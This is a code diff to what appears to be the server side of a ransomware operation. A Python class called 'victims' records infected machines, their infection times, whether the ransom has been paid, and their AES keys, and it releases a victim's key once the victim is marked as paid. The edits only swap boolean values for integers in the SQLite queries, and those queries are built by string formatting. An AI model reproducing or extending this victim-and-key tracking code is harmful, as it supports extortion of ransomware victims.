@@ -15,11 +15,11 @@ class victims:
         cursor.execute("""CREATE TABLE IF NOT EXISTS victims (
                          ID         VARCHAR(32)    NOT NULL,
                          INFTIME    VARCHAR(100)    NOT NULL,
-                         RANSOM     BOOLEAN         NOT NULL,
+                         RANSOM     TINYINT(1)         NOT NULL,
                          AESKEY     VARCHAR(100)    NOT NULL)""")
         db.commit()
         cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
-                                VALUES ('{i}', '{t}', 'FALSE', '123')""".format(
+                                VALUES ('{i}', '{t}', 0, '123')""".format(
                                     i=uuid.uuid1().hex,t=time.ctime()))
         db.commit()
         db.close()
@@ -35,7 +35,7 @@ class victims:
             self.vicList.append({
                 'id': i[0], 
                 'inf_time': i[1], 
-                'ransom': bool(i[2]),
+                'ransom': True if i[2] else False,
                 'AES_key': i[3]})
         # print(self.vicList[0]['id'])
         db.close()
@@ -51,7 +51,7 @@ class victims:
         db = sqlite3.connect(self.dbname)
         cursor = db.cursor()
         cursor.execute("""INSERT INTO victims (ID, INFTIME, RANSOM, AESKEY) 
-                                VALUES ('{i}', '{t}', FALSE, '{k}')""".format(
+                                VALUES ('{i}', '{t}', 0, '{k}')""".format(
                                     i=vid, t=time.ctime(), k=pkey))
         db.commit()
         db.close()
@@ -68,7 +68,7 @@ class victims:
                 self.vicList[index]['ransom'] = True
                 db = sqlite3.connect(self.dbname)
                 cursor = db.cursor()
-                cursor.execute("""UPDATE victims SET RANSOM=TRUE WHERE ID='{i}'""".format(i=paidid))
+                cursor.execute("""UPDATE victims SET RANSOM=1 WHERE ID='{i}'""".format(i=paidid))
                 db.commit()
                 r = cursor.execute("""SELECT AESKEY FROM victims WHERE ID='{i}'""".format(i=paidid))
                 result = r.fetchone()
